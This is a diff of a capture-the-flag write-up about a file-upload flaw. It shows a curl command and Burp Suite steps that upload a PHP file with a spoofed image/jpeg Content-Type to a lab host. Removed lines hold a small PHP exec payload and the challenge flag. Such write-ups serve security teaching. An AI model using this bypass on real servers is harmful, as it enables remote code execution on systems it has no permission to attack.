@@ -1,43 +1,35 @@
 # **Description:**
+While testing the file upload functionality on the website, I discovered that the application does not properly validate uploaded file types. This allowed me to upload a PHP script disguised as an image, which was then executed on the server, revealing the flag.
 
-The challenge presented an image upload form that only accepted image files. The goal was to bypass the restriction and upload a PHP file to execute arbitrary commands on the server.
+---
 
-## **Vulnerability:**
+## **Method 1: Using curl**
+I used the following `curl` command to upload a PHP file with a fake `Content-Type` header:
 
-The file upload feature did not properly validate MIME types on the server side, allowing an attacker to spoof the content type and upload non-image files.
-
-## **Exploitation:**
-
-### `Crafting the Malicious File:`
-A PHP file was created with the following content:
-```
-<?php exec "ls" ?>
-```
-This command lists the contents of the directory upon execution.
-
-### `Bypassing MIME Type Restrictions:`
-To upload the PHP file while bypassing the restriction, the MIME type was changed using the `curl` command:
-```
+```bash
 curl -X POST -F "Upload=Upload" -F "uploaded=@file.php;type=image/jpeg" "http://10.11.100.245/index.php?page=upload"
 ```
-By setting the file type to `image/jpeg`, the server accepted the PHP file as an image.
 
-### `Upload Form Analysis:`
-The upload form on the website:
-```
-<form enctype="multipart/form-data" action="#" method="POST">
-    <input type="hidden" name="MAX_FILE_SIZE" value="100000" />
-    Choose an image to upload:  <br />
-    <input name="uploaded" type="file" /><br />
-    <br />
-    <input type="submit" name="Upload" value="Upload">
-</form>
-```
-This form allows file uploads but does not enforce server-side verification of the file type beyond what the browser reports.
+- `-X POST` sends a POST request.
+- `-F "Upload=Upload"` simulates the upload form submission.
+- `-F "uploaded=@file.php;type=image/jpeg"` attaches a PHP file while spoofing its content type as `image/jpeg`.
+- The server accepted the file and executed it, revealing the flag.
 
-### `Flag Retrieval:`
-After executing the `curl` command, the server responded with an HTML page containing the flag:
-```
-<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>
-```
-The flag `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8` was successfully extracted.
+---
+
+## **Method 2: Using Burp Suite**
+Another approach involved **Burp Suite** to manipulate the request manually:
+
+1. **Intercept the Request:**
+   - I navigated to the upload page and uploaded a dummy image.
+   - Burp Suite intercepted the request.
+
+2. **Modify the Request:**
+   - Inside Burp Proxy, I changed the `Content-Type` of the uploaded file to `image/jpeg` while keeping the filename as `file.php`.
+   - This tricked the server into accepting and executing my PHP payload.
+
+3. **Forward the Request:**
+   - After modifying the request in **Burp Proxy**, I forwarded it.
+   - The file was successfully uploaded and executed when accessed, revealing the flag on the webpage.
+
+---
